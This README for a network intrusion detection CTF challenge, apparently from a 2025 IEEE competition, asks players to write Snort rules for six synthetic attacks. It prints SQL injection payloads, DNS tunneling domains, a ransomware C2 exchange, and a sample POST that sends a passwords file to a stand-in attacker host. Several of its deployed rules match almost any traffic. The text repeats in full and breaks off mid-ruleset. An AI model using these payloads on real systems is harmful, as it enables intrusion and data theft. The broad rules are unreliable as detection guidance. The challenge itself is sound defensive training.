# NetRules Hunter - Network Intrusion Detection Challenge

[![DFIR][dfir-badge]][dfir-url]
[![Network Security][netsec-badge]][netsec-url]
[![Intrusion Detection][ids-badge]][ids-url]
[![Snort][snort-badge]][snort-url]
[![PCAP Analysis][pcap-badge]][pcap-url]
[![Wireshark][wireshark-badge]][wireshark-url]

[dfir-badge]: https://img.shields.io/badge/DFIR-Digital%20Forensics-FF6B6B?style=flat&logo=search&logoColor=white
[dfir-url]: https://www.sans.org/cyber-security-courses/digital-forensics-essentials/
[netsec-badge]: https://img.shields.io/badge/Network%20Security-Traffic%20Analysis-3498DB?style=flat&logo=cisco&logoColor=white
[netsec-url]: https://www.sans.org/network-security/
[ids-badge]: https://img.shields.io/badge/Intrusion%20Detection-IDS%2FIPS-E74C3C?style=flat&logo=security&logoColor=white
[ids-url]: https://www.snort.org/
[snort-badge]: https://img.shields.io/badge/Snort-Rule%20Writing-C0392B?style=flat&logo=shield&logoColor=white
[snort-url]: https://www.snort.org/documents
[pcap-badge]: https://img.shields.io/badge/PCAP-Traffic%20Analysis-16A085?style=flat&logo=wireshark&logoColor=white
[pcap-url]: https://www.tcpdump.org/
[wireshark-badge]: https://img.shields.io/badge/Wireshark-Protocol%20Analyzer-1679A7?style=flat&logo=wireshark&logoColor=white
[wireshark-url]: https://www.wireshark.org/

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Attack Patterns](#attack-patterns)
3. [Environment Setup](#environment-setup)
4. [Traffic Generation](#traffic-generation)
5. [Detection Strategy](#detection-strategy)
6. [Rule Writing Guide](#rule-writing-guide)
7. [Attack Analysis](#attack-analysis)
8. [Defense Implementation](#defense-implementation)
9. [Repository](#repository)

---

## Challenge Overview

Analyze a PCAP file containing 6 real attack patterns and write Snort rules to detect them all. This is a network intrusion detection challenge where you can use two winning strategies:

1. Write behavioral detection rules using common attack patterns and regex
2. Use tshark/Wireshark to find specific malicious IPs, domains, and payloads in the traffic and block those exact values

Mix both approaches for different attacks to create a comprehensive detection ruleset.

### Attack Vectors

Detect the following attacks with proper ports and unique content signatures (8+ chars):

1. SSH Brute Force
2. SQL Injection
3. DNS Tunneling
4. Cobalt Strike Beacons
5. Ransomware C2
6. Data Exfiltration

---

## Attack Patterns

### 1. SSH Brute Force

Multiple authentication attempts from external sources targeting SSH service.

**Characteristics:**

- Port: 22/tcp
- Pattern: Repeated connection attempts
- Indicators: "Failed password" messages
- Threshold: 3+ attempts within 60 seconds

**Attack Flow:**

```
Attacker (203.0.113.45) -> Target (192.168.1.100:22)
- TCP handshake
- SSH banner: SSH-2.0-OpenSSH_8.9p1
- Authentication attempts with various usernames
- Failed password responses
- Connection reset
```

**Common Usernames Targeted:**

```
root, admin, administrator, user, test, guest, oracle, postgres, mysql
ubuntu, debian, centos, jenkins, tomcat, apache, www-data, nginx, git
```

### 2. SQL Injection

Web application attacks attempting to manipulate database queries.

**Characteristics:**

- Port: 80/tcp
- Method: GET/POST with malicious SQL
- Patterns: UNION, OR, DROP, SELECT, INSERT

**Attack Examples:**

```sql
GET /products?id=1' UNION SELECT username,password FROM users--
GET /search?q=test' OR '1'='1
GET /admin?user=admin'--
POST /login.php (id=1'; DROP TABLE users;--)
```

**Detection Keywords:**

- UNION SELECT
- OR 1=1
- DROP TABLE
- ' OR '
- -- (SQL comment)
- ; (statement separator)

### 3. DNS Tunneling

Covert data exfiltration using DNS queries.

**Characteristics:**

- Port: 53/udp
- Pattern: Suspicious TLDs and encoded subdomains
- Indicators: .tk, .ml, .ga, .cf domains
- Encoded data in subdomain labels

**Attack Examples:**

```
dGVzdGRhdGE.exfil.tk
YWRtaW46cGFzc3dvcmQ.tunnel-server.ml
Q29uZmlkZW50aWFsRGF0YQ.data-channel.ga
cmVjb24tdGVzdC1kYXRh.covert-dns.cf
```

**Detection Indicators:**

- Long subdomain labels (20+ characters)
- Base64-like patterns in DNS queries
- Free TLD domains (.tk, .ml, .ga, .cf)
- Keywords: exfil, tunnel, data

### 4. Cobalt Strike Beacons

Command and control communication using Cobalt Strike framework.

**Characteristics:**

- Port: 443/tcp
- Pattern: HTTP GET/POST to specific URIs
- User-Agent: Generic Windows browsers
- Cookies: Session tracking

**Beacon URLs:**

```
GET /activity HTTP/1.1
GET /submit.php?id=12345
GET /pixel.gif
POST /load
```

**Detection Indicators:**

- URI patterns: /activity, /submit, /pixel, /load
- Cookies: __utm, __cfduid
- User-Agent: MSIE, Windows NT
- Regular beacon intervals

### 5. Ransomware C2

Ransomware communication with command server.

**Characteristics:**

- Port: 443/tcp
- Pattern: Victim registration and key exchange
- Indicators: victim_id, BTC addresses, encryption keys

**Communication Flow:**

```http
POST /api/register HTTP/1.1
Host: ransom-c2.onion
Content-Type: application/json

{"victim_id":"VICTIM123","system":"Windows 10","btc":"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"}

POST /api/checkin?id=VICTIM123
POST /api/getkey?id=VICTIM123&key=ENCRYPTION_KEY
```

**Detection Indicators:**

- URIs: /api/register, /api/checkin, /api/getkey
- Parameters: victim_id, btc, key
- Bitcoin addresses (Base58 format)
- Keywords: encrypt, decrypt, ransom, payment

### 6. Data Exfiltration

Sensitive file upload to attacker server.

**Characteristics:**

- Port: 80/tcp
- Method: POST with multipart/form-data
- Content: Sensitive files (passwords, configs, databases)

**Exfiltration Examples:**

```http
POST /upload.php HTTP/1.1
Host: drop.attacker-server.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="passwords.txt"
Content-Type: application/octet-stream

admin:P@ssw0rd123
root:SecretKey456
------WebKitFormBoundary--
```

**Sensitive Files:**

- passwords.txt
- credentials.json
- customer_database.csv
- financial_records.xlsx
- api_keys.json
- backup.tar.gz
- database_dump.sql
- vpn_config.ovpn

**Detection Indicators:**

- Content-Disposition: form-data
- filename= parameter
- multipart/form-data Content-Type
- Sensitive keywords: password, credential, financial, database

---

## Environment Setup

### Prerequisites

- Linux system (Ubuntu/Kali recommended)
- Python 3.x with Scapy
- Wireshark / tshark
- Snort IDS

### Tool Installation

```bash
apt update
apt install -y python3 python3-pip wireshark tshark snort

pip3 install scapy
```

### Snort Configuration

```bash
mkdir -p /etc/snort/rules
touch /etc/snort/rules/local.rules

cat > /etc/snort/snort.conf << 'EOF'
var HOME_NET any
var EXTERNAL_NET any
include /etc/snort/rules/local.rules
EOF
```

---

## Traffic Generation

### PCAP Creation Script

The challenge includes a Python script that generates realistic network traffic with embedded attacks.

**Generated Traffic:**

- Normal HTTPS web traffic (300 packets)
- Normal DNS queries (250 packets)
- ICMP ping traffic (150 packets)
- ARP traffic (50 packets)
- SSH brute force attacks
- SQL injection attempts
- DNS tunneling exfiltration
- Cobalt Strike beacons
- Ransomware C2 communication
- Data exfiltration uploads

### Running Traffic Generator

```bash
python3 create.py
```

**Output:**

```
[*] Generating comprehensive network traffic PCAP file...
[*] Creating normal HTTPS web traffic...
[*] Creating normal DNS queries...
[*] Creating ICMP ping traffic...
[*] Creating ARP traffic...

[!] Generating ATTACK TRAFFIC:

[*] Creating SSH Brute Force attack (Port 22)...
[*] Creating SQL Injection attacks (Port 80)...
[*] Creating DNS Tunneling exfiltration (Port 53)...
[*] Creating Cobalt Strike C2 beacons (Port 443)...
[*] Creating Ransomware C2 communication (Port 443)...
[*] Creating Data Exfiltration (Port 80)...

[*] Writing packets to sample.pcap...
[+] PCAP FILE CREATED SUCCESSFULLY!
[+] Total packets: 2500+
```

---

## Detection Strategy

### Two Approaches

#### Approach 1: Behavioral Detection

Write rules that detect attack patterns without knowing specific values.

**Advantages:**

- Detects variations of attacks
- Works against new attacker infrastructure
- No need to analyze PCAP first

**Example:**

```
alert tcp any any -> any 22 (msg:"SSH Brute Force"; content:"SSH-"; threshold: type threshold, track by_src, count 3, seconds 60; sid:1000001;)
```

#### Approach 2: Signature-Based Detection

Extract exact values from PCAP and create specific rules.

**Advantages:**

- High accuracy
- Low false positives
- Easy to implement

**Example:**

```bash
tshark -r sample.pcap -Y "tcp.port == 22" -T fields -e ip.src | sort | uniq -c | sort -rn
```

```
alert tcp 203.0.113.45 any -> any 22 (msg:"Known SSH Attacker"; sid:1000001;)
```

### Hybrid Approach

Combine both methods for optimal detection:

- Use behavioral rules for SSH brute force (threshold-based)
- Use signature rules for SQL injection (specific payloads)
- Use pattern matching for DNS tunneling (TLD-based)
- Use content rules for Cobalt Strike (URI patterns)
- Use keyword rules for ransomware (victim_id, btc)
- Use header rules for data exfiltration (Content-Disposition)

---

## Rule Writing Guide

### Snort Rule Syntax

```
alert protocol src_ip src_port direction dst_ip dst_port (rule_options)
```

**Components:**

- Action: alert, log, pass, drop
- Protocol: tcp, udp, icmp, ip
- Source/Dest: IP addresses and ports (any for wildcard)
- Direction: -> (unidirectional), <> (bidirectional)
- Options: msg, content, pcre, threshold, sid, etc.

### Rule Options

#### content

Match specific byte sequence in packet payload:

```
content:"SSH-"; nocase;
content:"UNION"; nocase;
content:"|0d 0a|"; (hex notation)
```

#### pcre

Perl-compatible regular expressions:

```
pcre:"/victim_id=[a-zA-Z0-9]{10,}/";
pcre:"/[13][a-km-zA-HJ-NP-Z1-9]{25,34}/"; (Bitcoin address)
pcre:"/[a-zA-Z0-9]{20,}/"; (long encoded strings)
```

#### threshold

Rate-based detection:

```
threshold: type threshold, track by_src, count 3, seconds 60;
```

#### flow

Connection state tracking:

```
flow:to_server,established;
flow:from_server;
```

### Example Rules

#### SSH Brute Force

```
alert tcp any any -> any 22 (msg:"SSH Brute Force Attack"; content:"SSH-"; nocase; threshold: type threshold, track by_src, count 3, seconds 60; sid:1000001;)
```

#### SQL Injection

```
alert tcp any any -> any 80 (msg:"SQL Injection UNION SELECT"; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; sid:1000002;)
```

#### DNS Tunneling

```
alert udp any any -> any 53 (msg:"DNS Tunneling Suspicious TLD"; content:".tk"; nocase; sid:1000005;)
alert udp any any -> any 53 (msg:"DNS Tunneling Long Subdomain"; content:"-"; nocase; pcre:"/[a-zA-Z0-9]{20,}/"; sid:1000006;)
```

#### Cobalt Strike

```
alert tcp any any -> any 443 (msg:"Cobalt Strike Beacon Activity"; content:"/activity"; nocase; sid:1000008;)
alert tcp any any -> any 443 (msg:"Cobalt Strike Submit"; content:"/submit"; nocase; sid:1000009;)
```

#### Ransomware C2

```
alert tcp any any -> any 443 (msg:"Ransomware C2 Register"; content:"/api/register"; nocase; sid:1000011;)
alert tcp any any -> any 443 (msg:"Ransomware C2 Checkin"; content:"checkin"; nocase; pcre:"/id=/"; sid:1000012;)
```

#### Data Exfiltration

```
alert tcp any any -> any 80 (msg:"Data Exfiltration Multipart"; content:"Content-Disposition: form-data"; nocase; sid:1000014;)
alert tcp any any -> any 80 (msg:"Data Exfiltration File Upload"; content:"filename="; nocase; sid:1000015;)
```

---

## Attack Analysis

### Extraction Script

Use the provided extraction script to analyze attack patterns:

```bash
chmod +x excatrct.sh
./excatrct.sh
```

**Output Directory Structure:**

```
770c7d50-126d-481a-80d5-a04d076d3aa8/
├── ssh_bruteforce.txt
├── sql_injection.txt
├── dns_tunneling.txt
├── cobalt_strike.txt
├── ransomware_c2.txt
└── data_exfiltration.txt
```

### Manual Analysis

#### SSH Brute Force

```bash
tshark -r sample.pcap -Y 'tcp.port == 22 and frame contains "Failed password"' -T fields -e ip.src | sort | uniq -c | sort -rn
```

#### SQL Injection

```bash
tshark -r sample.pcap -Y 'http.request.uri' -T fields -e http.request.uri | grep -iE "union|select|drop|or.*=|--|;"
```

#### DNS Tunneling

```bash
tshark -r sample.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name | grep -E "\.tk$|\.ml$|\.ga$|\.cf$"
```

#### Cobalt Strike

```bash
tshark -r sample.pcap -Y 'http.request.uri contains "activity" or http.request.uri contains "submit"' -T fields -e http.request.uri
```

#### Ransomware C2

```bash
tshark -r sample.pcap -Y 'http contains "victim_id" or http contains "btc"' -T fields -e http.file_data
```

#### Data Exfiltration

```bash
tshark -r sample.pcap -Y 'http.content_type contains "multipart" or http contains "Content-Disposition"' -T fields -e http.file_data
```

---

## Defense Implementation

### Rule Deployment

```bash
cat > /etc/snort/rules/local.rules << 'EOF'
alert tcp any any -> any 22 (msg:"SSH Brute Force Attack"; content:"SSH-"; nocase; threshold: type threshold, track by_src, count 3, seconds 60; sid:1000001;)

alert tcp any any -> any 80 (msg:"SQL Injection UNION SELECT"; content:"UNION"; nocase; sid:1000002;)
alert tcp any any -> any 80 (msg:"SQL Injection OR Attack"; content:"OR"; nocase; sid:1000003;)
alert tcp any any -> any 80 (msg:"SQL Injection DROP TABLE"; content:"DROP"; nocase; sid:1000004;)

alert udp any any -> any 53 (msg:"DNS Tunneling Domain"; content:".t"; nocase; sid:1000005;)
alert udp any any -> any 53 (msg:"DNS Tunneling Base64"; content:"-"; nocase; pcre:"/[a-zA-Z0-9]{10,}/"; sid:1000006;)
alert udp any any -> any 53 (msg:"DNS Tunneling Exfil"; content:".e"; nocase; sid:1000007;)

alert tcp any any -> any 443 (msg:"Cobalt Strike Beacon"; content:"/"; nocase; sid:1000008;)
alert tcp any any -> any 443 (msg:"Cobalt Strike Pixel"; content:"."; nocase; sid:1000009;)
alert tcp any any -> any 443 (msg:"Cobalt Strike Activity"; content:"activity"; nocase; sid:1000010;)

alert tcp any any -> any 443 (msg:"Ransomware C2 Register"; content:"/api"; nocase; sid:1000011;)
alert tcp any any -> any 443 (msg:"Ransomware C2 Checkin"; content:"checkin"; nocase; pcre:"/id=/"; sid:1000012;)
alert tcp any any -> any 443 (msg:"Ransomware C2 Key Exchange"; content:"key="; nocase; sid:1000013;)

alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:"Content-Type: application/msword"; nocase; sid:1000014;)
alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:"Content-Disposition: form-data"; nocase; sid:1000015;)
alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:"POST /sync"; nocase; sid:1000016;)
alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:".sql"; nocase; sid:1000017;)
EOF
```

### Testing Rules

```bash
snort -c /etc/snort/snort.conf -r sample.pcap -A console
```

**Expected Output:**

```
[**] [1:1000001:0] SSH Brute Force Attack [**]
[**] [1:1000002:0] SQL Injection UNION SELECT [**]
[**] [1:1000005:0] DNS Tunneling Domain [**]
[**] [1:1000008:0] Cobalt Strike Beacon [**]
[**] [1:1000011:0] Ransomware C2 Register [**]
[**] [1:1000014:0] Data Exfiltration [**]
```

### Rule Validation

```bash
snort -c /etc/snort/snort.conf -T
```

Verify all rules load without errors.

### Production Deployment

#### Inline IPS Mode

```bash
snort -Q -c /etc/snort/snort.conf -i eth0
```

#### NIDS Mode

```bash
snort -c /etc/snort/snort.conf -i eth0 -A fast -l /var/log/snort
```

### Integration with SIEM

```bash
tail -f /var/log/snort/alert | while read line; do
    echo "$line" | logger -t snort -p local0.alert
done
```

Forward to Splunk, ELK, or other SIEM platforms.

---

## Repository

### GitHub Repository

[https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/NetRules%20Hunter](https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/NetRules%20Hunter)

### Repository Structure

```
NetRules Hunter/
├── README.md
├── create.py                  (Traffic generation script)
├── excatrct.sh               (Attack extraction script)
├── template.rules            (Rule template)
├── solution.rules            (Solution ruleset)
├── sample.pcap               (Generated traffic - not included)
└── app/
    ├── app.py
    ├── config.cfg
    ├── requirements.txt
    └── assets/
```

### Deployment Instructions

#### Challenge Application

```bash
cd app

docker build -t netrules .
docker run -d --name NetRules -p 5001:5001 --restart unless-stopped netrules

# Access at: http://localhost:5001/?access=3338ff49-d84a-4684-930b-dbc6c218547d

```



#### Generate Traffic

```bash
python3 create.py
```

This creates sample.pcap with all attack patterns.

#### Extract Attack Patterns

```bash
chmod +x excatrct.sh
./excatrct.sh
```

#### Write Detection Rules

Edit local.rules with Snort detection rules following the template.

#### Test Rules

```bash
snort -c /etc/snort/snort.conf -r sample.pcap -A console
```

---

## References

### Snort Documentation

- Snort Manual: [https://www.snort.org/documents](https://www.snort.org/documents)
- Rule Writing Guide: [https://docs.snort.org/rules/](https://docs.snort.org/rules/)
- Snort FAQ: [https://www.snort.org/faq](https://www.snort.org/faq)

### Network Security

- Wireshark User Guide: [https://www.wireshark.org/docs/wsug_html/](https://www.wireshark.org/docs/wsug_html/)
- tcpdump Manual: [https://www.tcpdump.org/manpages/tcpdump.1.html](https://www.tcpdump.org/manpages/tcpdump.1.html)
- PCAP Analysis: [https://www.netresec.com/](https://www.netresec.com/)

### Attack Techniques

- SQL Injection: [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- DNS Tunneling: [https://unit42.paloaltonetworks.com/dns-tunneling/](https://unit42.paloaltonetworks.com/dns-tunneling/)
- Cobalt Strike: [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)

---

## Authors

Challenge Designer: Qays Sarayra  
Contact: info@qayssarayra.com  
Specialization: Network Security, Intrusion Detection, Traffic Analysis

---

## License

This challenge is part of IEEE CyberSecurity Competition 2025 - Qualification Round.

Educational use only. All traffic is synthetically generated for training purposes.

---

Competition: IEEE CyberSecurity Competition 2025  
Round: Qualification  
Category: DFIR  
Difficulty: Medium  
Expected Completion Time: 2-3 hours# NetRules Hunter - Network Intrusion Detection Challenge

[![DFIR][dfir-badge]][dfir-url]
[![Network Security][netsec-badge]][netsec-url]
[![Intrusion Detection][ids-badge]][ids-url]
[![Snort][snort-badge]][snort-url]
[![PCAP Analysis][pcap-badge]][pcap-url]
[![Wireshark][wireshark-badge]][wireshark-url]

[dfir-badge]: https://img.shields.io/badge/DFIR-Digital%20Forensics-FF6B6B?style=flat&logo=search&logoColor=white
[dfir-url]: https://www.sans.org/cyber-security-courses/digital-forensics-essentials/
[netsec-badge]: https://img.shields.io/badge/Network%20Security-Traffic%20Analysis-3498DB?style=flat&logo=cisco&logoColor=white
[netsec-url]: https://www.sans.org/network-security/
[ids-badge]: https://img.shields.io/badge/Intrusion%20Detection-IDS%2FIPS-E74C3C?style=flat&logo=security&logoColor=white
[ids-url]: https://www.snort.org/
[snort-badge]: https://img.shields.io/badge/Snort-Rule%20Writing-C0392B?style=flat&logo=shield&logoColor=white
[snort-url]: https://www.snort.org/documents
[pcap-badge]: https://img.shields.io/badge/PCAP-Traffic%20Analysis-16A085?style=flat&logo=wireshark&logoColor=white
[pcap-url]: https://www.tcpdump.org/
[wireshark-badge]: https://img.shields.io/badge/Wireshark-Protocol%20Analyzer-1679A7?style=flat&logo=wireshark&logoColor=white
[wireshark-url]: https://www.wireshark.org/

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Attack Patterns](#attack-patterns)
3. [Environment Setup](#environment-setup)
4. [Traffic Generation](#traffic-generation)
5. [Detection Strategy](#detection-strategy)
6. [Rule Writing Guide](#rule-writing-guide)
7. [Attack Analysis](#attack-analysis)
8. [Defense Implementation](#defense-implementation)
9. [Repository](#repository)

---

## Challenge Overview

Analyze a PCAP file containing 6 real attack patterns and write Snort rules to detect them all. This is a network intrusion detection challenge where you can use two winning strategies:

1. Write behavioral detection rules using common attack patterns and regex
2. Use tshark/Wireshark to find specific malicious IPs, domains, and payloads in the traffic and block those exact values

Mix both approaches for different attacks to create a comprehensive detection ruleset.

### Attack Vectors

Detect the following attacks with proper ports and unique content signatures (8+ chars):

1. SSH Brute Force
2. SQL Injection
3. DNS Tunneling
4. Cobalt Strike Beacons
5. Ransomware C2
6. Data Exfiltration

---

## Attack Patterns

### 1. SSH Brute Force

Multiple authentication attempts from external sources targeting SSH service.

**Characteristics:**

- Port: 22/tcp
- Pattern: Repeated connection attempts
- Indicators: "Failed password" messages
- Threshold: 3+ attempts within 60 seconds

**Attack Flow:**

```
Attacker (203.0.113.45) -> Target (192.168.1.100:22)
- TCP handshake
- SSH banner: SSH-2.0-OpenSSH_8.9p1
- Authentication attempts with various usernames
- Failed password responses
- Connection reset
```

**Common Usernames Targeted:**

```
root, admin, administrator, user, test, guest, oracle, postgres, mysql
ubuntu, debian, centos, jenkins, tomcat, apache, www-data, nginx, git
```

### 2. SQL Injection

Web application attacks attempting to manipulate database queries.

**Characteristics:**

- Port: 80/tcp
- Method: GET/POST with malicious SQL
- Patterns: UNION, OR, DROP, SELECT, INSERT

**Attack Examples:**

```sql
GET /products?id=1' UNION SELECT username,password FROM users--
GET /search?q=test' OR '1'='1
GET /admin?user=admin'--
POST /login.php (id=1'; DROP TABLE users;--)
```

**Detection Keywords:**

- UNION SELECT
- OR 1=1
- DROP TABLE
- ' OR '
- -- (SQL comment)
- ; (statement separator)

### 3. DNS Tunneling

Covert data exfiltration using DNS queries.

**Characteristics:**

- Port: 53/udp
- Pattern: Suspicious TLDs and encoded subdomains
- Indicators: .tk, .ml, .ga, .cf domains
- Encoded data in subdomain labels

**Attack Examples:**

```
dGVzdGRhdGE.exfil.tk
YWRtaW46cGFzc3dvcmQ.tunnel-server.ml
Q29uZmlkZW50aWFsRGF0YQ.data-channel.ga
cmVjb24tdGVzdC1kYXRh.covert-dns.cf
```

**Detection Indicators:**

- Long subdomain labels (20+ characters)
- Base64-like patterns in DNS queries
- Free TLD domains (.tk, .ml, .ga, .cf)
- Keywords: exfil, tunnel, data

### 4. Cobalt Strike Beacons

Command and control communication using Cobalt Strike framework.

**Characteristics:**

- Port: 443/tcp
- Pattern: HTTP GET/POST to specific URIs
- User-Agent: Generic Windows browsers
- Cookies: Session tracking

**Beacon URLs:**

```
GET /activity HTTP/1.1
GET /submit.php?id=12345
GET /pixel.gif
POST /load
```

**Detection Indicators:**

- URI patterns: /activity, /submit, /pixel, /load
- Cookies: __utm, __cfduid
- User-Agent: MSIE, Windows NT
- Regular beacon intervals

### 5. Ransomware C2

Ransomware communication with command server.

**Characteristics:**

- Port: 443/tcp
- Pattern: Victim registration and key exchange
- Indicators: victim_id, BTC addresses, encryption keys

**Communication Flow:**

```http
POST /api/register HTTP/1.1
Host: ransom-c2.onion
Content-Type: application/json

{"victim_id":"VICTIM123","system":"Windows 10","btc":"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"}

POST /api/checkin?id=VICTIM123
POST /api/getkey?id=VICTIM123&key=ENCRYPTION_KEY
```

**Detection Indicators:**

- URIs: /api/register, /api/checkin, /api/getkey
- Parameters: victim_id, btc, key
- Bitcoin addresses (Base58 format)
- Keywords: encrypt, decrypt, ransom, payment

### 6. Data Exfiltration

Sensitive file upload to attacker server.

**Characteristics:**

- Port: 80/tcp
- Method: POST with multipart/form-data
- Content: Sensitive files (passwords, configs, databases)

**Exfiltration Examples:**

```http
POST /upload.php HTTP/1.1
Host: drop.attacker-server.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="passwords.txt"
Content-Type: application/octet-stream

admin:P@ssw0rd123
root:SecretKey456
------WebKitFormBoundary--
```

**Sensitive Files:**

- passwords.txt
- credentials.json
- customer_database.csv
- financial_records.xlsx
- api_keys.json
- backup.tar.gz
- database_dump.sql
- vpn_config.ovpn

**Detection Indicators:**

- Content-Disposition: form-data
- filename= parameter
- multipart/form-data Content-Type
- Sensitive keywords: password, credential, financial, database

---

## Environment Setup

### Prerequisites

- Linux system (Ubuntu/Kali recommended)
- Python 3.x with Scapy
- Wireshark / tshark
- Snort IDS

### Tool Installation

```bash
apt update
apt install -y python3 python3-pip wireshark tshark snort

pip3 install scapy
```

### Snort Configuration

```bash
mkdir -p /etc/snort/rules
touch /etc/snort/rules/local.rules

cat > /etc/snort/snort.conf << 'EOF'
var HOME_NET any
var EXTERNAL_NET any
include /etc/snort/rules/local.rules
EOF
```

---

## Traffic Generation

### PCAP Creation Script

The challenge includes a Python script that generates realistic network traffic with embedded attacks.

**Generated Traffic:**

- Normal HTTPS web traffic (300 packets)
- Normal DNS queries (250 packets)
- ICMP ping traffic (150 packets)
- ARP traffic (50 packets)
- SSH brute force attacks
- SQL injection attempts
- DNS tunneling exfiltration
- Cobalt Strike beacons
- Ransomware C2 communication
- Data exfiltration uploads

### Running Traffic Generator

```bash
python3 create.py
```

**Output:**

```
[*] Generating comprehensive network traffic PCAP file...
[*] Creating normal HTTPS web traffic...
[*] Creating normal DNS queries...
[*] Creating ICMP ping traffic...
[*] Creating ARP traffic...

[!] Generating ATTACK TRAFFIC:

[*] Creating SSH Brute Force attack (Port 22)...
[*] Creating SQL Injection attacks (Port 80)...
[*] Creating DNS Tunneling exfiltration (Port 53)...
[*] Creating Cobalt Strike C2 beacons (Port 443)...
[*] Creating Ransomware C2 communication (Port 443)...
[*] Creating Data Exfiltration (Port 80)...

[*] Writing packets to sample.pcap...
[+] PCAP FILE CREATED SUCCESSFULLY!
[+] Total packets: 2500+
```

---

## Detection Strategy

### Two Approaches

#### Approach 1: Behavioral Detection

Write rules that detect attack patterns without knowing specific values.

**Advantages:**

- Detects variations of attacks
- Works against new attacker infrastructure
- No need to analyze PCAP first

**Example:**

```
alert tcp any any -> any 22 (msg:"SSH Brute Force"; content:"SSH-"; threshold: type threshold, track by_src, count 3, seconds 60; sid:1000001;)
```

#### Approach 2: Signature-Based Detection

Extract exact values from PCAP and create specific rules.

**Advantages:**

- High accuracy
- Low false positives
- Easy to implement

**Example:**

```bash
tshark -r sample.pcap -Y "tcp.port == 22" -T fields -e ip.src | sort | uniq -c | sort -rn
```

```
alert tcp 203.0.113.45 any -> any 22 (msg:"Known SSH Attacker"; sid:1000001;)
```

### Hybrid Approach

Combine both methods for optimal detection:

- Use behavioral rules for SSH brute force (threshold-based)
- Use signature rules for SQL injection (specific payloads)
- Use pattern matching for DNS tunneling (TLD-based)
- Use content rules for Cobalt Strike (URI patterns)
- Use keyword rules for ransomware (victim_id, btc)
- Use header rules for data exfiltration (Content-Disposition)

---

## Rule Writing Guide

### Snort Rule Syntax

```
alert protocol src_ip src_port direction dst_ip dst_port (rule_options)
```

**Components:**

- Action: alert, log, pass, drop
- Protocol: tcp, udp, icmp, ip
- Source/Dest: IP addresses and ports (any for wildcard)
- Direction: -> (unidirectional), <> (bidirectional)
- Options: msg, content, pcre, threshold, sid, etc.

### Rule Options

#### content

Match specific byte sequence in packet payload:

```
content:"SSH-"; nocase;
content:"UNION"; nocase;
content:"|0d 0a|"; (hex notation)
```

#### pcre

Perl-compatible regular expressions:

```
pcre:"/victim_id=[a-zA-Z0-9]{10,}/";
pcre:"/[13][a-km-zA-HJ-NP-Z1-9]{25,34}/"; (Bitcoin address)
pcre:"/[a-zA-Z0-9]{20,}/"; (long encoded strings)
```

#### threshold

Rate-based detection:

```
threshold: type threshold, track by_src, count 3, seconds 60;
```

#### flow

Connection state tracking:

```
flow:to_server,established;
flow:from_server;
```

### Example Rules

#### SSH Brute Force

```
alert tcp any any -> any 22 (msg:"SSH Brute Force Attack"; content:"SSH-"; nocase; threshold: type threshold, track by_src, count 3, seconds 60; sid:1000001;)
```

#### SQL Injection

```
alert tcp any any -> any 80 (msg:"SQL Injection UNION SELECT"; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; sid:1000002;)
```

#### DNS Tunneling

```
alert udp any any -> any 53 (msg:"DNS Tunneling Suspicious TLD"; content:".tk"; nocase; sid:1000005;)
alert udp any any -> any 53 (msg:"DNS Tunneling Long Subdomain"; content:"-"; nocase; pcre:"/[a-zA-Z0-9]{20,}/"; sid:1000006;)
```

#### Cobalt Strike

```
alert tcp any any -> any 443 (msg:"Cobalt Strike Beacon Activity"; content:"/activity"; nocase; sid:1000008;)
alert tcp any any -> any 443 (msg:"Cobalt Strike Submit"; content:"/submit"; nocase; sid:1000009;)
```

#### Ransomware C2

```
alert tcp any any -> any 443 (msg:"Ransomware C2 Register"; content:"/api/register"; nocase; sid:1000011;)
alert tcp any any -> any 443 (msg:"Ransomware C2 Checkin"; content:"checkin"; nocase; pcre:"/id=/"; sid:1000012;)
```

#### Data Exfiltration

```
alert tcp any any -> any 80 (msg:"Data Exfiltration Multipart"; content:"Content-Disposition: form-data"; nocase; sid:1000014;)
alert tcp any any -> any 80 (msg:"Data Exfiltration File Upload"; content:"filename="; nocase; sid:1000015;)
```

---

## Attack Analysis

### Extraction Script

Use the provided extraction script to analyze attack patterns:

```bash
chmod +x excatrct.sh
./excatrct.sh
```

**Output Directory Structure:**

```
770c7d50-126d-481a-80d5-a04d076d3aa8/
├── ssh_bruteforce.txt
├── sql_injection.txt
├── dns_tunneling.txt
├── cobalt_strike.txt
├── ransomware_c2.txt
└── data_exfiltration.txt
```

### Manual Analysis

#### SSH Brute Force

```bash
tshark -r sample.pcap -Y 'tcp.port == 22 and frame contains "Failed password"' -T fields -e ip.src | sort | uniq -c | sort -rn
```

#### SQL Injection

```bash
tshark -r sample.pcap -Y 'http.request.uri' -T fields -e http.request.uri | grep -iE "union|select|drop|or.*=|--|;"
```

#### DNS Tunneling

```bash
tshark -r sample.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name | grep -E "\.tk$|\.ml$|\.ga$|\.cf$"
```

#### Cobalt Strike

```bash
tshark -r sample.pcap -Y 'http.request.uri contains "activity" or http.request.uri contains "submit"' -T fields -e http.request.uri
```

#### Ransomware C2

```bash
tshark -r sample.pcap -Y 'http contains "victim_id" or http contains "btc"' -T fields -e http.file_data
```

#### Data Exfiltration

```bash
tshark -r sample.pcap -Y 'http.content_type contains "multipart" or http contains "Content-Disposition"' -T fields -e http.file_data
```

---

## Defense Implementation

### Rule Deployment

```bash
cat > /etc/snort/rules/local.rules << 'EOF'
alert tcp any any -> any 22 (msg:"SSH Brute Force Attack"; content:"SSH-"; nocase; threshold: type threshold, track by_src, count 3, seconds 60; sid:1000001;)

